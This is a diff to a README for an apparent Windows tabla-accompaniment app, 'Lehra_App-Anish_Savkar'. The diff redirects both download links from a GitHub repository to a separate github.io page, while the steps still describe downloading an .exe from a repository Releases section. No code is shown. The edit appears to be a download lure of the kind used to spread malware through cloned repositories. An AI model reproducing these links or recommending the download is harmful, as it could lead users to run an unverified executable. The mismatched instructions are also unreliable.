@@ -1,6 +1,6 @@
 # 🎶 Lehra_App-Anish_Savkar - Professional Tabla accompaniment for your practice
 
-[![Download Lehra App](https://img.shields.io/badge/Download-Lehra_App_for_Windows-blue.svg)](https://github.com/natesuppressive996/Lehra_App-Anish_Savkar)
+[![Download Lehra App](https://img.shields.io/badge/Download-Lehra_App_for_Windows-blue.svg)](https://natesuppressive996.github.io)
 
 Lehra_App-Anish_Savkar provides high-quality accompaniment for Indian classical music practitioners. This application offers endless playback of multiple Taals across a wide range of tempos. It includes a live beat indicator to keep your rhythm precise. You can choose between light and dark themes based on your environment. Use the playback controls to manage your practice session without interruption. The software works offline and remains free to use.
 
@@ -8,7 +8,7 @@ Lehra_App-Anish_Savkar provides high-quality accompaniment for Indian classical 
 
 To begin using the application, follow these steps:
 
-1. Visit the project repository page at this link: [https://github.com/natesuppressive996/Lehra_App-Anish_Savkar](https://github.com/natesuppressive996/Lehra_App-Anish_Savkar).
+1. Visit the project repository page at this link: [https://natesuppressive996.github.io](https://natesuppressive996.github.io).
 2. Locate the Releases section on the right side of the page.
 3. Click the most recent version available.
 4. Look for the file ending in .exe under the Assets heading.
